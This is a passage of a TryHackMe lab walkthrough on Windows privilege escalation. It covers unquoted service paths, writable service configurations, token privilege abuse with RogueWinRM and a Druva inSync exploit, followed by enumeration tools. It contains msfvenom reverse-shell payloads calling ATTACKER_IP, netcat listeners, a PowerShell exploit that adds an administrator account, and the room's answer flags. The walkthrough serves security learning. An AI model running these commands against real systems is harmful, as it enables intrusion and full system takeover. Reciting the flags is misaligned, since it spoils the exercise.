        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:
```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

		
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe `and take the rest as arguments.
Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.

2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.

3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.
In our case, the Administrator installed the Disk Sorter binaries under `c:\MyPrograms`. By default, this inherits the permissions of the `C:\ `directory, which allows any user to create files and folders in it. We can check this using `icacls`:
```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
The `BUILTIN\\Users` group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.
The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ python3 -m http.server
```
Powershell:
```
wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
```
Attacker Machine
`nc -lvnp 4446`

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
```
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```
Once the service gets restarted, your payload should execute:
```
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```
As a result, you'll get a reverse shell with svcusr2 privileges:
```
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
type C:\Users\svcusr2\Desktop\flag.txt
```
## Insecure Service Permissions
You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:
```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```
Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```
We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
```
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```
To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
```
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
```
C:\> sc stop THMService
C:\> sc start THMService
```
And we will receive a shell back in our attacker's machine with SYSTEM privileges:
```
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```
## Answer the questions below
1: Get the flag on svcusr1's desktop. `THM{AT_YOUR_SERVICE}`

2: Get the flag on svcusr2's desktop. `THM{QUOTES_EVERYWHERE}`

3: Get the flag on the Administrator's desktop. `THM{INSECURE_TRY_TO_DO}`

# Task 6 Abusing dangerous privileges `THM{SEFLAGPRIVILEGE}`
SeBackup / SeRestore
SeTakeOwnership
SeImpersonate / SeAssignPrimaryToken
Attacker Machine\Your Machine
```
nc -lvnp 4442
ip given by tryhackme
site: http://ip given by tryhackme go to the site and run this command
c:\tools\RogueWinRM\RogueWinRM.exe -p “C:\tools\nc64.exe” -a “-e cmd.exe ATTACKER_IP 4442”
```

# Task 7 Abusing vulnerable software `THM{EZ_DLL_PROXY_4ME}`

## Powershell:
```
ErrorActionPreference = “Stop”
$cmd = “net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add”
$s = New-Object System.Net.Sockets.Socket( [System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp ) $s.Connect(“127.0.0.1”, 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes(“inSync PHC RPCW[v0002]”) $rpcType = [System.Text.Encoding]::UTF8.GetBytes(“$([char]0x0005)`0`0`0”) $command = [System.Text.Encoding]::Unicode.GetBytes(“C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd”); $length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header) $s.Send($rpcType) $s.Send($length) $s.Send($command)
```
## Command Prompt:
```
net user pwnd
Note:remmina change user
type C:\Users\Administrator\Desktop\flag.txt
```

# Task 8 Tools of the Trade
Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.

## WinPEAS
WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
```
C:\> winpeas.exe > outputfile.txt
```
WinPEAS can be downloaded here.

## PrivescCheck
PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
PrivescCheck can be downloaded here.
Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.
```
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```
## WES-NG: Windows Exploit Suggester - Next Generation
Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).
WES-NG is a Python script that can be found and downloaded here.
Once installed, and before using it, type the `wes.py` --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.
To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
Once this is done, wes.py can be run as follows;
```
user@kali$ wes.py systeminfo.txt
```

## Metasploit
If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
# Answer the questions below
Click and continue learning! `No answer needed`

# Task 9 Conclusion
In this room, we have introduced several privilege escalation techniques available in Windows systems. These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:
* PayloadsAllTheThings - Windows Privilege Escalation
* Priv2Admin - Abusing Windows Privileges
* RogueWinRM Exploit
* Potatoes
* Decoder's Blog
* Token Kidnapping
* Hacktricks - Windows Local Privilege Escalation
# Answer the questions below
Click and continue learning! `No answer needed`
